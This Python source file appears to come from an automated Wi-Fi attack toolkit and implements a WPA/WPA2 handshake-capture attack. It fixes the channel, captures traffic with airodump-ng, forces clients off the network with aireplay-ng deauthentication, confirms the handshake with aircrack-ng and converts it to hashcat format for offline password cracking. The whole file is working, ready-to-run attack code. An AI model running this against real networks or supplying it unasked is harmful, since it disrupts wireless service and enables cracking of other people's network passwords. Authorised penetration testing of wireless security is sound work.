"""4-way handshake attack: targeted deauth + airodump capture."""

from __future__ import annotations

import glob
import os
import time

from anywifi.attacks.base import Attack
from anywifi.config import DEAUTH_COUNT, HANDSHAKE_CAPTURE_TIME
from anywifi.model import AttackContext, AttackResult, Network

_WPA_ENC = {"WPA", "WPA2", "WPA2/WPA3"}


class HandshakeAttack(Attack):
    vector = "handshake"
    label = "WPA/WPA2 4-way handshake (deauth)"

    def applicable(self, net: Network) -> bool:
        if net.encryption not in _WPA_ENC:
            return False
        # If PMF is required (usually WPA3), deauth won't work.
        if net.pmf_required:
            return False
        return True

    def run(self, net: Network, ctx: AttackContext) -> AttackResult:
        runner = ctx.runner
        iface = ctx.interface
        prefix = os.path.join(str(ctx.output_dir), f"hs_{_safe(net.bssid)}")

        runner.run(["iw", "dev", iface, "set", "channel", str(net.channel)])
        dump = runner.spawn([
            "airodump-ng", "-c", str(net.channel), "--bssid", net.bssid,
            "-w", prefix, iface,
        ])

        captured = False
        rounds = 0
        try:
            deadline = time.time() + HANDSHAKE_CAPTURE_TIME
            while time.time() < deadline:
                rounds += 1
                who = f"{len(net.clients)} client(s)" if net.clients else "broadcast"
                ctx.status(f"deauth round {rounds} ({who}) · waiting for handshake…")
                self._deauth(runner, iface, net)
                if ctx.dry_run:
                    captured = True
                    break
                time.sleep(8)
                cap = _latest(prefix)
                if cap and _has_handshake(runner, cap, net.bssid):
                    captured = True
                    break
        finally:
            runner.stop(dump)

        cap = _latest(prefix) or (prefix + "-01.cap")
        if not captured:
            return self._result(net, success=False, capture_file=cap,
                                message="No handshake captured")

        # Convert to 22000 (for hashcat); otherwise fall back to .cap + aircrack
        ctx.status("handshake captured · preparing hash…")
        hashfile = prefix + ".22000"
        if runner.has("hcxpcapngtool") or ctx.dry_run:
            runner.run(["hcxpcapngtool", "-o", hashfile, cap], timeout=60)
            if os.path.exists(hashfile):
                return self._result(net, success=True, hash_file=hashfile,
                                    capture_file=cap,
                                    message="Handshake captured — deauth worked")
        return self._result(net, success=True, capture_file=cap,
                            message="Handshake captured — deauth worked (.cap)")

    def _deauth(self, runner, iface: str, net: Network) -> None:
        if net.clients:
            for client in net.clients[:3]:
                runner.run(
                    ["aireplay-ng", "--deauth", str(DEAUTH_COUNT),
                     "-a", net.bssid, "-c", client, iface],
                    timeout=15,
                )
        else:
            runner.run(
                ["aireplay-ng", "--deauth", str(DEAUTH_COUNT), "-a", net.bssid, iface],
                timeout=15,
            )


def _safe(bssid: str) -> str:
    return bssid.replace(":", "")


def _latest(prefix: str):
    files = sorted(glob.glob(prefix + "*.cap"))
    return files[-1] if files else None


def _has_handshake(runner, cap_file: str, bssid: str) -> bool:
    """Check whether the cap file contains a handshake, using aircrack-ng."""
    # input_text="" → won't block on the interactive selection prompt if multiple APs.
    res = runner.run(["aircrack-ng", cap_file], timeout=30, capture=True, input_text="")
    out = res.stdout or ""
    for line in out.splitlines():
        if bssid.upper() in line.upper() and "handshake" in line.lower():
            # e.g. "(1 handshake)" — anything non-zero means captured
            if "(0 handshake" not in line.lower():
                return True
    return "1 handshake" in out.lower()
